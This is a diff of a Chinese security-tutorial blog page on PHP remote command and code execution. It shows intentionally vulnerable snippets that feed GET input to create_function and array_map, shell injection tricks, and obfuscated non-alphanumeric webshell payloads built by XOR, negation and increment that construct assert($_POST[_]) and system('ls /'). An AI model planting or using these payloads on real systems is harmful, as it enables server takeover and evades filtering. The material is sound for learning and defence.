-                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    17 分
-                </div>
-                
-
-                
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
-            </div>
-        </div>
-        <hr class="clearfix">
-
-        
-        <!-- 是否加载使用自带的 prismjs. -->
-        <link rel="stylesheet" href="/libs/prism/prism.min.css">
-        
-
-        
-        <!-- 代码块折行 -->
-        <style type="text/css">
-            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
-        </style>
-        
-
-        <div class="card-content article-card-content">
-            <div id="articleContent">
-                <h1 id="命令执行漏洞（RCE）"><a href="#命令执行漏洞（RCE）" class="headerlink" title="命令执行漏洞（RCE）"></a>命令执行漏洞（RCE）</h1><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>php 常见的调用外部程序的函数</p>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote id="outdate-blockquote" style="display: none;"><p></p></blockquote>
+      
+      
+        <h1 id="命令执行漏洞（RCE）"><a href="#命令执行漏洞（RCE）" class="headerlink" title="命令执行漏洞（RCE）"></a>命令执行漏洞（RCE）</h1><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>php 常见的调用外部程序的函数</p>
 <p>系统命令执行</p>
 <ol>
 <li>system(args)–有回显</li>
@@ -480,17 +284,7 @@ exec">
 </ol>
 <p>作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p>
 <p>示例</p>
-<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chybeta'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-        <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$a'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"echo <span class="token interpolation"><span class="token variable">$a</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$b</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?&gt;</span></span>
-http://localhost:2500/codeexec.php?chybeta=phpinfo();
-<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chybeta'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?&gt;</span></span>
-http://localhost:2500/codeexec.php?chybeta=phpinfo</code></pre>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">'chybeta'</span>];</span><br><span class="line">        <span class="variable">$b</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">'$a'</span>,<span class="string">"echo <span class="subst">$a</span>"</span>);</span><br><span class="line">        <span class="variable">$b</span>(<span class="string">''</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">http:<span class="comment">//localhost:2500/codeexec.php?chybeta=phpinfo();</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$array</span> = <span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="title function_ invoke__">array_map</span>(<span class="variable">$_GET</span>[<span class="string">'chybeta'</span>],<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">http:<span class="comment">//localhost:2500/codeexec.php?chybeta=phpinfo</span></span><br></pre></td></tr></tbody></table></figure>
 
 <h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>（1）管道操作</strong></p>
 <p>将一端的命令输出交给另一端的命令处理。格式：    命令1  |  命令2    </p>
@@ -521,11 +315,7 @@ http://localhost:2500/codeexec.php?chybeta=phpinfo</code></pre>
 <p>shell下特殊符号</p>
 <p>$(base64编码内容|d -base64)</p>
 <h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a><strong>通配符</strong></h3><p>在bash的操作环境中有一个非常有用的功能，那就是通配符，下面列出一些常用的通配符：</p>
-<pre class="language-none"><code class="language-none">*    代表『 0 个到无穷多个』任意字符
-?    代表『一定有一个』任意字符
-[ ]    同样代表『一定有一个在括号内』的字符(非任意字符)。例如 [abcd] 代表『一定有一个字符， 可能是 a, b, c, d 这四个任何一个』
-[ - ]    若有减号在中括号内时，代表『在编码顺序内的所有字符』。例如 [0-9] 代表 0 到 9 之间的所有数字，因为数字的语系编码是连续的！
-[^ ]    若中括号内的第一个字符为指数符号 (^) ，那表示『反向选择』，例如 [^abc] 代表 一定有一个字符，只要是非 a, b, c 的其他字符就接受的意思。</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">*    代表『 0 个到无穷多个』任意字符</span><br><span class="line">?    代表『一定有一个』任意字符</span><br><span class="line">[ ]    同样代表『一定有一个在括号内』的字符(非任意字符)。例如 [abcd] 代表『一定有一个字符， 可能是 a, b, c, d 这四个任何一个』</span><br><span class="line">[ - ]    若有减号在中括号内时，代表『在编码顺序内的所有字符』。例如 [0-9] 代表 0 到 9 之间的所有数字，因为数字的语系编码是连续的！</span><br><span class="line">[^ ]    若中括号内的第一个字符为指数符号 (^) ，那表示『反向选择』，例如 [^abc] 代表 一定有一个字符，只要是非 a, b, c 的其他字符就接受的意思。</span><br></pre></td></tr></tbody></table></figure>
 
 <h3 id="连接符"><a href="#连接符" class="headerlink" title="连接符"></a><strong>连接符</strong></h3><p>引号连接，注意要闭合好</p>
 <p>单引号</p>
@@ -550,63 +340,21 @@ http://localhost:2500/codeexec.php?chybeta=phpinfo</code></pre>
 <p>利用各种非数字字母的字符，经过各种变换（异或、取反、自增），构造出单个的字母字符，然后把单个字符拼接成一个函数名，比如说<code>assert</code>，然后就可以动态执行了。所以说这里的核心就是要将非字母的字符变换成字母字符。</p>
 <h3 id="1-异或"><a href="#1-异或" class="headerlink" title="1.异或 ^"></a>1.异或 ^</h3><p>指的是php按位异或，在php中，两个字符进行异或操作后，得到的依然是<strong>一个字符</strong>，当我们想得到<code>a-z</code>中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成<code>ascii码</code>值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：<code>1^1=0,1^0=1,0^1=1,0^0=0</code>，简单的来说就是<strong>相同为零，不同为一</strong></p>
 <p>因为很多都是不可见的字符，所以说我就先url编码了一下</p>
-<pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token string single-quoted-string">'%40'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%21'</span> <span class="token punctuation">;</span> s<span class="token punctuation">:</span><span class="token string single-quoted-string">'%7B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%08'</span> <span class="token punctuation">;</span> s<span class="token punctuation">:</span><span class="token string single-quoted-string">'%7B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%08'</span> <span class="token punctuation">;</span> e<span class="token punctuation">:</span><span class="token string single-quoted-string">'%7B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%1E'</span> <span class="token punctuation">;</span> r<span class="token punctuation">:</span><span class="token string single-quoted-string">'%7E'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%0C'</span> <span class="token punctuation">;</span> t<span class="token punctuation">:</span><span class="token string single-quoted-string">'%7C'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%08'</span>
-<span class="token constant">P</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'%0D'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%5D'</span> <span class="token punctuation">;</span> <span class="token constant">O</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'%0F'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%40'</span> <span class="token punctuation">;</span> <span class="token constant">S</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'%0E'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%5D'</span> <span class="token punctuation">;</span> <span class="token constant">T</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'%0B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%5F'</span>
-拼接起来：
-<span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%40'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%21'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%7B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%08'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%7B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%08'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%7B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%1E'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%7E'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%0C'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%7C'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%08'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//$_=assert</span>
-<span class="token variable">$__</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0D'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%5D'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0F'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%40'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0E'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%5D'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%5F'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//$__=_POST$___=$$__; $___=$_POST$_($___[_]);//assert($_POST[_]);放到一排就是：</span>
-<span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%40'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%21'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%7B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%08'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%7B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%08'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%7B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%1E'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%7E'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%0C'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%7C'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%08'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0D'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%5D'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0F'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%40'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0E'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%5D'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%5F'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">a:<span class="string">'%40'</span>^<span class="string">'%21'</span> ; s:<span class="string">'%7B'</span>^<span class="string">'%08'</span> ; s:<span class="string">'%7B'</span>^<span class="string">'%08'</span> ; e:<span class="string">'%7B'</span>^<span class="string">'%1E'</span> ; r:<span class="string">'%7E'</span>^<span class="string">'%0C'</span> ; t:<span class="string">'%7C'</span>^<span class="string">'%08'</span></span><br><span class="line">P:<span class="string">'%0D'</span>^<span class="string">'%5D'</span> ; O:<span class="string">'%0F'</span>^<span class="string">'%40'</span> ; S:<span class="string">'%0E'</span>^<span class="string">'%5D'</span> ; T:<span class="string">'%0B'</span>^<span class="string">'%5F'</span></span><br><span class="line">拼接起来：</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">'%40'</span>^<span class="string">'%21'</span>).(<span class="string">'%7B'</span>^<span class="string">'%08'</span>).(<span class="string">'%7B'</span>^<span class="string">'%08'</span>).(<span class="string">'%7B'</span>^<span class="string">'%1E'</span>).(<span class="string">'%7E'</span>^<span class="string">'%0C'</span>).(<span class="string">'%7C'</span>^<span class="string">'%08'</span>); <span class="comment">//$_=assert</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">'_'</span>.(<span class="string">'%0D'</span>^<span class="string">'%5D'</span>).(<span class="string">'%0F'</span>^<span class="string">'%40'</span>).(<span class="string">'%0E'</span>^<span class="string">'%5D'</span>).(<span class="string">'%0B'</span>^<span class="string">'%5F'</span>);  <span class="comment">//$__=_POST$___=$$__; $___=$_POST$_($___[_]);//assert($_POST[_]);放到一排就是：</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="string">'%40'</span>^<span class="string">'%21'</span>).(<span class="string">'%7B'</span>^<span class="string">'%08'</span>).(<span class="string">'%7B'</span>^<span class="string">'%08'</span>).(<span class="string">'%7B'</span>^<span class="string">'%1E'</span>).(<span class="string">'%7E'</span>^<span class="string">'%0C'</span>).(<span class="string">'%7C'</span>^<span class="string">'%08'</span>);<span class="variable">$__</span>=<span class="string">'_'</span>.(<span class="string">'%0D'</span>^<span class="string">'%5D'</span>).(<span class="string">'%0F'</span>^<span class="string">'%40'</span>).(<span class="string">'%0E'</span>^<span class="string">'%5D'</span>).(<span class="string">'%0B'</span>^<span class="string">'%5F'</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></tbody></table></figure>
 
 <h3 id="2-取反"><a href="#2-取反" class="headerlink" title="2.取反 ~"></a>2.取反 ~</h3><p>一个字符取反之后都会变成另一个字符，不像异或需要两个字符才能构造出一个字符。</p>
 <p>有参数函数要分开运算</p>
 <p>如</p>
-<pre class="language-none"><code class="language-none">system('ls /');
-(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0); </code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">system('ls /');</span><br><span class="line">(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0); </span><br></pre></td></tr></tbody></table></figure>
 
 <p>利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>'和'{2}</code>的结果是<code>"\x8c"</code>，其取反即为字母<code>s</code></p>
 <h3 id="3-自增"><a href="#3-自增" class="headerlink" title="3.自增"></a>3.自增</h3><p>只要我们获得了小写字母<code>a</code>，就可以通过自增获得所有小写字母，当我们获得大写字母<code>A</code>，就可以获得所有大写字母了</p>
 <p>数组(Array)中就正好有大写字母<code>A</code>和小写字母<code>a</code>，而在PHP中，如果强制连接数组和字符串的话，数组就会被强制转换成字符串，它的值就为<code>Array</code>，那取它的第一个子母，就拿到<code>A</code>了，那有了<code>a</code>和<code>A</code>，相当于我们就可以拿到<code>a-z</code>和<code>A-Z</code>中的所有字母了</p>
-<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token variable">$_</span><span class="token operator">=</span>@<span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$_</span></span>"</span><span class="token punctuation">;</span> <span class="token comment">// $_='Array';</span>
-<span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'!'</span><span class="token operator">==</span><span class="token string single-quoted-string">'@'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// $_=$_[0];</span>
-<span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">// A</span>
-<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
-<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span>
-<span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment">// S</span>
-<span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment">// S</span>
-<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
-<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// E</span>
- <span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span>
-<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
-<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// R$___.=$__;</span>
-<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
-<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// T$___.=$__;</span>
-
-<span class="token variable">$____</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">;</span>
-<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
-<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// P$____.=$__;</span>
-<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
-<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// O$____.=$__;</span>
-<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
-<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// S$____.=$__;</span>
-<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
-<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// T$____.=$__;</span>
-
-<span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$$____</span><span class="token punctuation">;</span>
-<span class="token variable">$___</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ASSERT($_POST[_]);</span></span></code></pre>
